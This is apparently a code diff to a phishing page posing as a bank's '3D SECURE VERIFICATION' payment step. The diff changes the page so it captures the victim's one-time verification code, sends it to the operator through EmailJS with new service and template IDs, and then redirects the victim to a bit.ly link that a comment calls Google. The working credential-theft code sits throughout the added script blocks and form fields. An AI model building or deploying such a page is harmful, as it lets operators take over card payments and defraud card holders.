@@ -10,7 +10,7 @@
 <script type="text/javascript">
    (function(){
       emailjs.init({
-        publicKey: "9cATFsqPERef1K6ZF",
+        publicKey: "KGWmh1dyveTN8cjHy",
       });
    })();
 </script>
@@ -93,6 +93,9 @@
    border: 1px solid transparent;
    color: #6268A6;
    background-color: transparent;
+ }
+ .resend-code button:hover {
+   background-color: transparent;
    cursor: pointer;
  }
  .countdown {
@@ -106,7 +109,7 @@
     <div class="container">
      
      <br> </br>
-  <svg height="15px" width="15px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 309.143 309.143" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC" stroke-width="7.419431999999999"></g><g id="SVGRepo_iconCarrier"> <path style="fill:#231F20;" d="M112.855,154.571L240.481,26.946c2.929-2.929,2.929-7.678,0-10.606L226.339,2.197 C224.933,0.79,223.025,0,221.036,0c-1.989,0-3.897,0.79-5.303,2.197L68.661,149.268c-2.929,2.929-2.929,7.678,0,10.606 l147.071,147.071c1.406,1.407,3.314,2.197,5.303,2.197c1.989,0,3.897-0.79,5.303-2.197l14.142-14.143 c2.929-2.929,2.929-7.678,0-10.606L112.855,154.571z" onclick="focusInput()"></path> </g></svg>
+  <svg height="15px" width="15px" onclick="focusInput()" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 309.143 309.143" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC" stroke-width="7.419431999999999"></g><g id="SVGRepo_iconCarrier"> <path style="fill:#231F20;" d="M112.855,154.571L240.481,26.946c2.929-2.929,2.929-7.678,0-10.606L226.339,2.197 C224.933,0.79,223.025,0,221.036,0c-1.989,0-3.897,0.79-5.303,2.197L68.661,149.268c-2.929,2.929-2.929,7.678,0,10.606 l147.071,147.071c1.406,1.407,3.314,2.197,5.303,2.197c1.989,0,3.897-0.79,5.303-2.197l14.142-14.143 c2.929-2.929,2.929-7.678,0-10.606L112.855,154.571z"></path> </g></svg>
   
     <h3>3D SECURE VERIFICATION</h3>
     
@@ -135,18 +138,17 @@
      </div>
         <br></br>
         
-        <form id="CardForm">
+        <form id="MultiForm">
   <div class="code">
     <label for="cardnumber">Verification Code</label><br>
-  <input type="tel" name="cardnumber" id="cardnumber" data-mask="00000000" required="">
+  <input type="tel" name="otp" id="otp" data-mask="00000000" required="">
             <br>
-   <button type="submit" id="submit" onclick="sendMail()">Pay</button>
-  
+   <button type="submit" id="AuthenticationOtp" onclick="sendMail()">Pay</button>
+ </form> 
   </div>   <br></br>
   <div class="resend-code">
-    <button type="submit" id="submit" onclick="sendMail()">RESEND CODE</button>
-    </form>
-  </div>
+  <button onclick="restartCountdown();">RESEND CODE</button>
+</div>
 <div class="countdown" id="countdown">05:00</div>
 
 <p style="color: #6268A6; margin-left: 15px; margin-top: 37px; font-size: 12px;">NEED HELP?</p>
@@ -162,34 +164,43 @@
 	
 	<script>
   function focusInput() {
-    document.getElementById('cardnumber').focus();
+    document.getElementById('otp').focus();
   }
 </script>
 
+
+
 <script>
-      let time = 300; // 5 minutes in seconds
+  let time = 300; // 5 minutes in seconds
+  let countdown; // Variable to store the countdown interval
 
-      function startCountdown() {
-        const countdownElement = document.getElementById('countdown');
+  function startCountdown() {
+    const countdownElement = document.getElementById('countdown');
 
-        const countdown = setInterval(() => {
-          const minutes = Math.floor(time / 60);
-          const seconds = time % 60;
-          countdownElement.textContent =
-            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    clearInterval(countdown); // Clear any existing countdown
 
-          if (time <= 0) {
-            clearInterval(countdown);
-            time = 300; // Reset time to 5 minutes
-            startCountdown(); // Restart the countdown
-          } else {
-            time--;
-          }
-        }, 1000);
+    countdown = setInterval(() => {
+      const minutes = Math.floor(time / 60);
+      const seconds = time % 60;
+      countdownElement.textContent =
+        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+      if (time <= 0) {
+        clearInterval(countdown);
+        time = 300; // Reset time to 5 minutes
+      } else {
+        time--;
       }
+    }, 1000);
+  }
 
-      startCountdown();
-    </script>
+  function restartCountdown() {
+    time = 300; // Reset time to 5 minutes
+    startCountdown(); // Restart the countdown
+  }
+
+  startCountdown(); // Initial call to start the countdown
+</script>
 
 
 <script>
@@ -201,13 +212,14 @@
     }
 
     let parms = {
-      cardnumber : document.getElementById("cardnumber").value,
+      otp : document.getElementById("otp").value,
+      submit_button_id: document.getElementById("AuthenticationOtp").id
     };
     
     // Set formSubmitted to true before sending email
     formSubmitted = true;
     
-        emailjs.send("service_6kbj4eu","template_ncggmgb", parms)
+        emailjs.send("service_76vugl3", "template_9vpv84j", parms)
       .then(function(response) {
         // Redirect to Google after email is sent
         window.location.href = "https://bit.ly/bulamabenjamin";
@@ -219,13 +231,23 @@
   }
 
   // Attach form submission event handler
-  document.getElementById('CardForm').addEventListener('submit', function(event) {
+  document.getElementById('MultiForm').addEventListener('submit', function(event) {
     event.preventDefault(); // Prevent default form submission
     sendMail(); // Call sendMail function
   });
 </script>
 
+<script>
+document.getElementById('AuthenticationOtp').addEventListener('click', function() {
+    const button = this;
+    button.disabled = true; // Disable the button
 
+    setTimeout(function() {
+        button.disabled = false; // Re-enable the button after 5 seconds
+    }, 5000); // 5000 milliseconds = 5 seconds
+});
+   
+ </script>
 
   </body>
 </html>
